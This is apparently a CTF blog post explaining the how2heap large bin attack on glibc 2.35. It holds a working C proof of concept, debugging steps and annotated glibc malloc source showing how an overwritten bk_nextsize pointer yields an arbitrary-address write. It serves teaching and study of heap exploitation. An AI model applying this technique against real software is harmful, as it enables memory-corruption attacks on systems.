---
layout: post
title: "how2heap 2.35 · large_bin_attack"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "PWN"]
---
{% raw %}
# POC

```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

A revisit to large bin attack for after glibc2.30

Relevant code snippet :

	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}


*/

int main(){
  /*Disable IO buffering to prevent stream from interfering with heap*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  printf("\n\n");
  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
  printf("Check 1 : \n");
  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  printf("Check 2 : \n");
  printf(">    if (bck->fd != fwd)\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  printf("This prevents the traditional large bin attack\n");
  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
  
  printf("====================================================================\n\n");

  size_t target = 0;
  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("And another chunk to prevent consolidate\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
  size_t *g2 = malloc(0x18);
  printf("Once again, allocate a guard chunk to prevent consolidate\n");

  printf("\n");

  free(p1);
  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");

  printf("\n");

  free(p2);
  printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
  printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);

  printf("\n");

  p1[3] = (size_t)((&target)-4);
  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);

  printf("\n");

  size_t *g4 = malloc(0x438);
  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
  printf("  the modified p1->bk_nextsize does not trigger any error\n");
  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd_nextsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);

  printf("\n");

  printf("In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
  printf("Target (%p) : %p\n",&target,(size_t*)target);

  printf("\n");
  printf("====================================================================\n\n");

  assert((size_t)(p2-2) == target);

  return 0;
}

```
该利用需要能覆写被free的chunk的bk_nextsize指针,通过利用`_int_malloc`中对unsorted bins整理的代码段，向任意地址写一个可控堆地址.
# 调试过程
## 1.申请两个large chunk
```c
size_t *p1 = malloc(0x428);
size_t *g1 = malloc(0x18);

size_t *p2 = malloc(0x418);
size_t *g2 = malloc(0x18);
```
![屏幕截图 2026-02-21 112329](/assets/ctf/98c4ba135f4832cad59f.webp)
## 2.一个放入large bins，一个unsorted bins
```
free(p1);
size_t *g3 = malloc(0x438);
free(p2);
```
这里注意两个chunk的大小，在unsorted bin中的chunk的size需要更小，使之在进入largebin时被放在largebin链表头（largebin的nextsize指针按size降序排列）

同时注意这里chunk的size的选择，要考虑largebin的分桶规则，两个chunk需要在同一个链表中才能完成攻击。
![屏幕截图 2026-02-21 234153](/assets/ctf/48c211281ccfc15effe5.webp)
## 3.VULNERABILITY
写入(目标地址-0x20)，覆盖bk_nextsize指针。
```
p1[3] = (size_t)((&target)-4);
```
![屏幕截图 2026-02-21 112519](/assets/ctf/cdc857306d9d65fa859c.webp)
## 4.触发
将unsorted bins的chunk放入large bins。
```
size_t *g4 = malloc(0x438);
```
![屏幕截图 2026-02-21 133205](/assets/ctf/b8263ec2de3e5a80755c.webp)
![屏幕截图 2026-02-21 112601](/assets/ctf/0c19c197a922d6911488.webp)![屏幕截图 2026-02-21 112618](/assets/ctf/aff67a2a3da2cba6e40f.webp)
利用代码段如下：
```c
    if ((unsigned long) (size)
< (unsigned long) chunksize_nomask (bck->bk))
//小于等于最小chunk（size被写了inuse位）。
      {
        fwd = bck;  //libc
        bck = bck->bk;   //free进large bins的p1
        victim->fd_nextsize = fwd->fd;   //向p2写free进large bins的p1
        victim->bk_nextsize = fwd->fd->bk_nextsize;  //向p2，写覆写在p1的目标地址
        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
        /*
        主要攻击位置！victim->bk_nextsize->fd_nextsize = victim，
        向（目标地址+0x20）位置写入p2的地址（带头的chunk地址）。
        */
      }
```


# `_int_malloc`中对unsorted bins的整理

```c
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      //从bk入口开始整理（fifo）。
        {
          bck = victim->bk;
          size = chunksize (victim);
          mchunkptr next = chunk_at_offset (victim, size);

          if (__glibc_unlikely (size <= CHUNK_HDR_SZ)
              || __glibc_unlikely (size > av->system_mem))
            malloc_printerr ("malloc(): invalid size (unsorted)");
          if (__glibc_unlikely (chunksize_nomask (next) < CHUNK_HDR_SZ)
              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
            malloc_printerr ("malloc(): invalid next size (unsorted)");
            //victim chunk与next chunk的size是否合法。
          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
            malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
            //next chunk的pre_size和victim chunk的size位的一致性检测。
          if (__glibc_unlikely (bck->fd != victim)
              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
            malloc_printerr ("malloc(): unsorted double linked list corrupted");
            //victim的fd是否为glibc，bck的fd指针是否为victim。
          if (__glibc_unlikely (prev_inuse (next)))
            malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
            //next chunk的pre_inuse位检测。

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
             下面是特殊情况下small bin范围的切操作。
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
              /*
              需要的chunk在small bin范围内，victim大小足够分配该chunk，
              victim为unsorted中唯一chunk，  victim是last_remainder被切后剩余部分。
              */
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
              //victim在large bin范围内，初始化nextsize指针。
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }
			//设置malloc块与剩余块的size与pre_size位。
              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
		set_non_main_arena (victim);
		//优先通过tcache分配chunk。
#if USE_TCACHE
	      /* Fill cache first, return to user only if cache fills.
		 We may return one of these chunks later.  */
	      if (tcache_nb
		  && tcache->counts[tc_idx] < mp_.tcache_count)
		{
		  tcache_put (victim, tc_idx);
		  return_cached = 1;
		  continue;
		}
	      else
		{
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
		}
#endif
            }

          /* place chunk in bin */

          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
              //large bin中不为空。
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert (chunk_main_arena (bck->bk));
                  if ((unsigned long) (size)
		      < (unsigned long) chunksize_nomask (bck->bk))
		      //小于等于最小chunk（size被写了inuse位）。
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert (chunk_main_arena (fwd));
                      //large bin中找第一个不大于victim的chunk。
                      while ((unsigned long) size < chunksize_nomask (fwd))
                        {
                          fwd = fwd->fd_nextsize;
			  assert (chunk_main_arena (fwd));
                        }
						//victim与找到的chunk大小一致。
                      if ((unsigned long) size
			  == (unsigned long) chunksize_nomask (fwd))
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                        //victim小于找到的chunk。
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
                            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                      if (bck->fd != fwd)
                        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
			//找到chunk与victim大小一致的整理，不写nextsize指针。
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

#if USE_TCACHE
      /* If we've processed as many chunks as we're allowed while
	 filling the cache, return one of the cached ones.  */
      ++tcache_unsorted_count;
      if (return_cached
	  && mp_.tcache_unsorted_limit > 0
	  && tcache_unsorted_count > mp_.tcache_unsorted_limit)
	{
	  return tcache_get (tc_idx);
	}
#endif

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }
```

{% endraw %}
